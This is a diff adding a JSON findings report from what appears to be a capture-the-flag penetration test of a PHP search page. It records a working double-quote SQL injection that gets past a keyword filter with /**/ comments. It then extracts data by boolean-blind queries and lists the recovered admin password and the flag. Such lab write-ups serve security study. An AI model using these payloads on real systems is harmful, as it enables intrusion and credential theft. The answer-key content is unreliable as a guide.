@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T12:08:44.127022+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "27153e26-a240-4d95-b0c3-014df26c1df8",
+      "timestamp": "2026-04-13T12:08:44.126931+00:00",
+      "title": "SQL Injection - Boolean-Blind on search.php (CTF Flag Extracted)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:59969/search.php",
+      "description": "Double-quote SQL injection in the 'username' POST parameter of search.php. A keyword-based WAF filter blocks space-delimited SQL keywords, but is bypassed by replacing spaces with /**/ MySQL comment blocks. Boolean-blind extraction via &&/ascii()/mid() functions extracted the admin plaintext password.",
+      "evidence": "1. Injection confirmed: admin\"# returns 'User exists: admin'\n2. Filter bypass: space+keyword+space is blocked, but keyword without spaces passes\n3. Boolean blind: admin\"/**/&&/**/ascii(mid(password,1,1))>X# reveals chars\n4. Admin password extracted: ThisIsBestPassword\n5. Login successful: flag{787d5a7f-ec79-4620-99c5-17c50dced80a}",
+      "tool_used": "manual + custom python script",
+      "cve": "",
+      "reproduction": {
+        "type": "script",
+        "command": "POST /search.php username=admin\"/**/&&/**/ascii(mid(password,1,1))>X# binary search",
+        "expected": "Returns 'User exists: admin' if condition true, 'No results' if false"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "5a6a59d4-4a27-4855-ad6a-6c6a1ca4b5e4",
+      "timestamp": "2026-04-13T12:09:01.039057+00:00",
+      "title": "PHPAbUsers Application Architecture",
+      "mermaid": "flowchart TD\n    Browser[\"Browser\"] --> Index[\"/index.php\\nPHPAbUsers Home\"]\n    Index --> Login[\"/login.php\\nLogin Form POST username+password\"]\n    Index --> Search[\"/search.php\\nUser Search POST username\"]\n    Login --> DB[(\"MySQL DB\\nusers table\")]\n    Search --> DB\n    DB --> Login\n    DB --> Search\n    Search --> Filter[\"WAF Filter\\nBlocks space+keyword+space\"]\n    Filter --> SQLi[\"Double-Quote SQLi\\nBoolean Blind via &&+ascii+mid\"]\n    SQLi --> DB\n    Login -->|\"admin:ThisIsBestPassword\"| Flag[\"flag{787d5a7f-ec79-4620-99c5-17c50dced80a}\"]"
+    }
+  ]
+}
